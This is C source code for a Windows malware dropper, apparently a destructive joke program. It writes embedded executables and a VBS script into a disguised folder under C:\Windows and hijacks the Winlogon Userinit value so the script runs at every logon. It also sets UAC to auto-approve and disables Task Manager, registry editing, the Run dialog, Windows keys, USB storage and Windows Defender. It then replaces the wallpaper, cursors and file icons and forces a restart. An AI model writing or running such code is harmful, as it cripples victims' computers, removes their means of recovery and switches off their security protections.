#include <Windows.h>
#include <shlobj.h>
#include "resource.h"

extern BOOL WINAPI ExtractFile(INT resourceId, CONST CHAR* resourceType, CONST CHAR* outFileDir, CONST CHAR* outFileName);
extern VOID WINAPI SetRegistryString(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, CONST CHAR* valueData);
extern VOID WINAPI SetRegistryExString(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, CONST CHAR* valueData);
extern VOID WINAPI SetRegistryDword(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, DWORD valueData);
extern BOOL WINAPI SystemRestart(VOID);

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	HANDLE hHeap = GetProcessHeap();
	if (hHeap == NULL) return 1;

	CONST CHAR ExtPath[] = "C:\\windows\\winbase_base_procid_none\\secureloc0x65";
	CHAR TempPath[MAX_PATH];

	GetTempPathA(MAX_PATH, TempPath);

	SHCreateDirectoryExA(NULL, ExtPath, NULL);

	ExtractFile(IDR_EXE1, RT_RCDATA, ExtPath, "tobi0a0c.exe");
	ExtractFile(IDR_EXE2, RT_RCDATA, ExtPath, "ui66.exe");
	ExtractFile(IDR_CURSOR1, RT_RCDATA, ExtPath, "rcur.cur");
	ExtractFile(IDI_ICON2, RT_RCDATA, ExtPath, "winsxs.ico");
	ExtractFile(IDR_VBS1, RT_RCDATA, ExtPath, "WinRapistI386.vbs");

	ExtractFile(IDR_TMP1, RT_RCDATA, TempPath, "w0alp.tmp");

	CHAR* wp_path = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH);
	lstrcpyA(wp_path, TempPath);

	lstrcatA(wp_path, "\\");
	lstrcatA(wp_path, "w0alp.tmp");

	if (!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp_path, SPIF_UPDATEINIFILE))
		MessageBoxA(NULL, "failed", "Error", MB_OK | MB_ICONHAND);

	HeapFree(hHeap, 0, wp_path);

	//スタートアップ登録
	SetRegistryString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", "userinit.exe,wscript.exe C:\\windows\\winbase_base_procid_none\\secureloc0x65\\WinRapistI386.vbs");

	//UACレベル下げ
	SetRegistryDword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system", "ConsentPromptBehaviorAdmin", 0);

	// 壁紙変更の禁止
	SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop", "NoChangingWallPaper", 1);

	// タスクマネージャーの無効化
	SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);

	// レジストリ編集ツールの無効化
	SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);

	//「ファイル名を指定して実行」の禁止
	SetRegistryDword(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 1);

	// Windowsキーショートカットの無効化
	SetRegistryDword(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoWinKeys", 1);

	// USBストレージの無効化
	SetRegistryDword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4);

	// Windows Defenderの無効化
	SetRegistryDword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1);

	//カーソル画像の変更
	CONST CHAR* cursorPath = "C:\\Windows\\winbase_base_procid_none\\secureloc0x65\\rcur.cur";
	SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "Arrow", cursorPath);
	SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "AppStarting", cursorPath);
	SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "Hand", cursorPath);

	//アイコン画像の変更
	CONST CHAR* IconPath = "C:\\Windows\\winbase_base_procid_none\\secureloc0x65\\winsxs.ico";
	SetRegistryString(HKEY_CLASSES_ROOT, "txtfile\\DefaultIcon", "", IconPath);
	SetRegistryString(HKEY_CLASSES_ROOT, "exefile\\DefaultIcon", "", IconPath);
	SetRegistryString(HKEY_CLASSES_ROOT, "mp3file\\DefaultIcon", "", IconPath);
	SetRegistryString(HKEY_CLASSES_ROOT, "mp4file\\DefaultIcon", "", IconPath);
	SetRegistryString(HKEY_CLASSES_ROOT, "inifile\\DefaultIcon", "", IconPath);

	Sleep(5000);

	SystemRestart();

	return 0;
}